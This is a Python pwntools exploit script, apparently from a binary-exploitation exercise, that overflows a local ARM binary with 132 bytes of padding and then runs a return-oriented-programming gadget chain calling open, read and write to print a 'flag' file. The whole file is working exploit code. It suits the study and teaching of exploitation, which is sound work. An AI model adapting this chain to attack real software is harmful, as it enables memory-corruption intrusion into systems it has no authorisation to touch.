#!/usr/bin/env python3
#!/usr/bin/env python3
import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "arm"
context.bits = "32"

# 1. open("flag", 0, 0);
# 2. read(3, global_variable_addr, size);
# 3. write(1, global_variable_addr, size);
io = process(["./9-rop1-arm"])
# 0x00010384: pop {r3, pc};
rop3 = 0x00010384
# 0x00010628: pop {r4, r5, r6, r7, r8, sb, sl, pc};
rop4 = 0x00010628
# 0x00010610: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
mov = 0x00010610
# 000103cc: open
open_addr = 0x000103CC
flag = 0xFFFF0F76
# flag = 0x666C6167  # galf
# flag = 0x67616C66  # flag
# 000103a8: read
read_addr = 0x000103A8
global_variable_addr = 0x021100
size = 0x100
# 000103f0: write
write_addr = 0x000103F0
# global_write_variable_addr = 0x00010438
offset = 132
JUNK = 0x4B4E554A

# pad
payload = b""
payload += p8(0x61) * offset
# 1. open("flag", 0, 0);
payload += struct.pack("I", rop3)
payload += struct.pack("I", open_addr)  # r3
payload += struct.pack("I", rop4)  # pc of rop3
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", flag)  # r7 -> r0
payload += struct.pack("I", 0)  # r8 -> r1
payload += struct.pack("I", 0)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", mov)  # pc of rop4
# 2. read(3, global_variable_addr, size);
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", 3)  # r7 -> r0
payload += struct.pack("I", global_variable_addr)  # r8 -> r1
payload += struct.pack("I", size)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", rop3)  # pc of rop4
payload += struct.pack("I", read_addr)  # r3
payload += struct.pack("I", mov)  # pc of rop3
# 3. write(1, global_variable_addr, size);
payload += struct.pack("I", JUNK)  # r4
payload += struct.pack("I", JUNK)  # r5
payload += struct.pack("I", JUNK)  # r6
payload += struct.pack("I", 1)  # r7 -> r0
payload += struct.pack("I", global_variable_addr)  # r8 -> r1
payload += struct.pack("I", size)  # sb -> r2
payload += struct.pack("I", JUNK)  # sl
payload += struct.pack("I", rop3)  # pc of rop4
payload += struct.pack("I", write_addr)  # r3
payload += struct.pack("I", mov)  # pc of rop3

with open("stdin.bin", "wb") as f:
    f.write(payload)

io.recv()
io.sendline(payload)
io.interactive()
